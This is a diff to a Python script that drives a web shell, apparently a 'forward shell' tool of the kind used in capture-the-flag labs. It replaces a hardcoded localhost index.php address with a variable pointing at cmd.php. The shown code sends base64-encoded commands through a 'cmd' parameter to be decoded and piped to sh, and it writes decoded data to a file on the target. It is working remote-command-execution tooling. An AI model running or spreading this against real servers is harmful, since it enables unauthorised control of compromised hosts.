@@ -4,6 +4,8 @@ import requests, time, threading, pdb, signal, sys
 from base64 import b64encode
 from random import randrange
 
+objective_url='http://127.0.0.1/cmd.php'
+
 class AllTheReads(object):
 	def __init__(self, interval=1):
 		self.interval = interval
@@ -27,7 +29,7 @@ def RunCmd(cmd):
 	payload = {
         	'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
 		}
-	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
+	result = (requests.get(objective_url, params=payload, timeout=5).text).strip()
 	return result
 
 def WriteCmd(cmd):
@@ -36,7 +38,7 @@ def WriteCmd(cmd):
 	payload = {
 		'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
 	}
-	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
+	result = (requests.get(objective_url, params=payload, timeout=5).text).strip()
 	return result
 
 def ReadCmd():
